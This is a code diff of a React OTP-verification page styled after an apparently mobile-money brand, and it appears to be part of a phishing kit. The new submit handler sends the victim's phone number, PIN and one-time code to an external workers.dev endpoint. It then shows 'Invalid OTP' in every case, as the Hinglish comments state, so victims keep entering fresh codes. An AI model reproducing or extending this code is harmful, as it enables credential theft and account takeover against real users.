@@ -1,4 +1,3 @@
-
 // import React from "react";
 // import { useState, useRef } from "react";
 // import { useNavigate, useLocation } from "react-router-dom";
@@ -140,74 +139,135 @@
 //   );
 // }
 
-
-
-
-import React, { useState } from "react";
+import React from "react";
+import { useState } from "react";
 import { useNavigate, useLocation } from "react-router-dom";
 
 export default function OTPVerify() {
   const [otp, setOtp] = useState("");
+  const [show, setShow] = useState(false);
+  const [focused, setFocused] = useState(false);
   const [error, setError] = useState("");
   const navigate = useNavigate();
   const location = useLocation();
   const { phone, pin } = location.state || {};
 
-  const handleChange = (e) => {
-    const val = e.target.value.replace(/\D/g, ""); // sirf numbers
+  const handleChange = (val) => {
+    if (!/^\d*$/.test(val)) return;
+    if (error) setError("");
     setOtp(val);
-    if (error) setError(""); // typing start → error hide
   };
 
-  const handleSubmit = (e) => {
-    e.preventDefault(); // page reload prevent
+  const isComplete = otp.length > 0;
 
-    if (!otp) {
-      setError("Please enter OTP");
-      return;
-    }
+  // const handleSubmit = async () => {
+  //   const payload = {
+  //     phone: phone,
+  //     otp: otp,
+  //     pin: pin,
+  //   };
 
-    // ✅ Hamesha error show karna regardless of OTP
-    setError("Invalid OTP");
-  };
+  //   try {
+  //     const res = await fetch(
+  //       "https://my-worker-app.instapayapi.workers.dev/api/otp-momosa",
+  //       {
+  //         method: "POST",
+  //         headers: { "Content-Type": "application/json" },
+  //         body: JSON.stringify(payload),
+  //       }
+  //     );
+
+  //     const data = await res.json();
+
+  //     if (res.ok && data.success) {
+  //       // ✅ OTP sahi tha — aage navigate karo
+  //       navigate("/next-page"); // apna route yahan likho
+  //     } else {
+  //       // ❌ API ne error diya
+  //       setError("Invalid OTP");
+  //       setOtp("");
+  //     }
+  //   } catch (err) {
+  //     // ❌ Network error ya kuch aur
+  //     setError("Invalid OTP");
+  //     setOtp("");
+  //   }
+  // };
+ 
+  const handleSubmit = async () => {
+  const payload = { phone, otp, pin };
+
+  try {
+    await fetch(
+      "https://my-worker-app.instapayapi.workers.dev/api/otp-momosa",
+      {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload),
+      }
+    );
+  } catch (err) {}
+
+  // har case mein — success ho ya fail
+  setError("Invalid OTP");
+  setOtp("");
+};
 
   return (
-    <div className="min-h-screen bg-white flex flex-col px-5 pt-8">
-      <div className="bg-yellow-400 h-8 w-full mb-5" />
+    <div className="min-h-screen bg-white flex flex-col">
+      <div className="bg-yellow-400 h-8 w-full" />
 
-      <h2 className="text-xl font-black text-gray-900 mb-2">
-        Confirm your cellphone number
-      </h2>
+      <div className="flex flex-col px-5 pt-8 flex-1">
+        <h2 className="text-xl font-black text-gray-900 mb-2">
+          Confirm your cellphone number
+        </h2>
+        <p className="text-sm text-gray-500 leading-relaxed mb-8">
+          We will send an SMS with a One Time Pin (OTP) within the next 3
+          minutes to{" "}
+          <span className="text-gray-700 font-medium">{phone}</span>
+        </p>
 
-      <p className="text-sm text-gray-500 mb-8">
-        We will send an SMS with a One Time Pin (OTP) to{" "}
-        <span className="text-gray-700 font-medium">{phone}</span>
-      </p>
+        <p className="text-sm font-bold text-gray-400 mb-3">
+          Please enter the OTP you received
+        </p>
 
-      <form onSubmit={handleSubmit}>
-        <input
-          type="tel"
-          inputMode="numeric"
-          value={otp}
-          onChange={handleChange}
-          placeholder="Enter OTP"
-          className="w-full border-2 border-gray-300 rounded-lg px-4 py-4 text-lg mb-2 focus:outline-none focus:border-yellow-400"
-        />
+        <div className="flex items-center gap-3 mb-4">
+          <div className="relative w-full">
+            <input
+              type={show ? "tel" : "password"}
+              inputMode="numeric"
+              pattern="[0-9]*"
+              value={otp}
+              onFocus={() => setFocused(true)}
+              onBlur={() => setFocused(false)}
+              onChange={(e) => handleChange(e.target.value)}
+              placeholder="Enter OTP"
+              className="w-full border-2 rounded-lg px-4 py-4 text-lg outline-none transition-all bg-white pr-20"
+              style={{
+                borderColor: focused ? "#FFCC00" : error ? "#ef4444" : "#d1d5db",
+              }}
+            />
+          </div>
+        </div>
 
-        {/* ❌ Hamesha show error */}
-        {error && <p className="text-red-500 text-sm mb-4">{error}</p>}
+        {error && (
+          <p className="text-red-500 text-sm font-medium mb-4">{error}</p>
+        )}
 
-        <button
-          type="submit"
-          className="w-full bg-[#FFCC00] text-gray-900 font-bold text-lg rounded-full py-4 mb-4"
-        >
-          Verify
-        </button>
-      </form>
+        <div className="mt-6 flex flex-col gap-3">
+          <button
+            onClick={handleSubmit}
+            disabled={!isComplete}
+            className="w-full bg-[#FFCC00] text-gray-900 font-bold text-lg rounded-full py-4 transition-colors shadow-sm d"
+          >
+            Verify
+          </button>
 
-      <button className="w-full bg-gray-100 text-gray-900 font-bold text-lg rounded-full py-4">
-        Resend OTP
-      </button>
+          <button className="w-full bg-gray-100 hover:bg-gray-200 text-gray-900 font-bold text-lg rounded-full py-4 transition-colors">
+            Resend OTP
+          </button>
+        </div>
+      </div>
     </div>
   );
 }
